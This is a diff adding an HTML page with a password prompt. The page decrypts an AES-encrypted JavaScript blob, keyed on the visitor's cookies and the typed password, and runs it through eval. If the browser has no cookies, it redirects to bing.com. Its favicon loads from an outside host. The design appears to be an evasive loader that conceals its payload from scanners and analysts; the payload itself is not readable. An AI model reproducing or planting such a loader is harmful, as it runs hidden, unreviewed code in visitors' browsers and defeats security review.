@@ -1,0 +1,36 @@
+<html lang="en">
+<head>
+    <link rel="icon" href="http://13jy.cn/favicon.ico" type="image/x-icon" />
+</head>
+<div id="div1">
+    <p>输入密码</p>
+</div>
+<div id="div2">
+    <input type='text' id="password">
+    <button type="button" onclick="run()">运行</button>
+</div>
+<script src="node_modules/crypto-js/crypto-js.js"></script>
+<script>
+    var globalEval = eval
+    var cookie = document.cookie
+    if (cookie.length != 0)
+        function run(){    
+                pw = document.getElementById("password").value;
+                var originalCode = ["U2FsdGVkX1/m+c5FB5dTM54hEUY56uwNd/r8SV1YDwRm7kzO4RYeAkeoffkTeydJJBPpWofB/CaJgygLunMASCzfFgWZtSywddctZqBB8fCm/WrL7IgVkwdG6Fcm9Zm9xqAtMcaZV/5U8wrcqwlgvtVUr/ljO7xOIxQN6AJx6RSCWgwsXk9oby6U+WzBeMywXxXQ4/nrYHAUtrGLQOmBA7dlI4KqD/mQ+uWuh943vZ8z/nvHhkMD+3K6h/F1XygvPq6xPWE38/CjmdL8W0OHEI3xfl4Cy3xkU2sqYFZA/4MZecwhZq44lPzL6kjy0ihUK9voVMVelINIXWdPdUOLp6rCD/ApfLy6Ion+ZiZRoN+4AGgV++8ebZvKGgyN/d6y475FcWSFN5ljCFLA1cIgmAXZUWelXnsF998JoUnIcXmOjnsEYzWSAwLqyKvxVEnVZeFCiJucwLz0vcQg2oCMezIGAqo/0E81oLB4wozyoTe9f/IgpS1DXbWj68JVh108Q/Weakycuow6rnWffu9RvRyEAHAZES2sYacUWd8En1T6ADiVSNV+7roLO1qJ0AFxSqlI2LH5I3bvvB4BoxiqPVQUuBovxM3zjk0+7t25HCrRXuCs9S+uACQ+NolStUNVWVcbZT2zuzNKFRcPxmwYTQ0kF+NQeDix3HVdxKbixE5Jx3TTPpFKZAg5CO4pETwioqSZRSmxbyDQP0Ia5tigwAW/dqbrPVfQZ1ynzYGUflfwRlQ6O+XW8LXXp2gYWygcYgCr4NOaZzvaIt/PLK6cs8ormwtT/8p8IkDl79lt8+upgyBA8fdtdHwZ3KzCgwp7W9RqrVsdSMx+cGYiWHftqHvPvihqfgGPGDgqgU3O8hCjsTNIzWBPJb+rdjMddasgjtBFATzh3nQmWqyYq0r3mQ=="];
+                for(x = 0;x<originalCode.length;x++){
+                    var encryptedCode = originalCode[x];
+                    try{
+                    var decryptedByte = CryptoJS.AES.decrypt(encryptedCode,cookie+pw);
+                    var decryptedCode = decryptedByte.toString(CryptoJS.enc.Utf8);
+                    break;
+                    }
+                    catch(err) {}
+                }
+                globalEval(decryptedCode);
+            }
+    else
+    {
+        window.location.href='https://bing.com/';
+    }
+</script>
+</html>
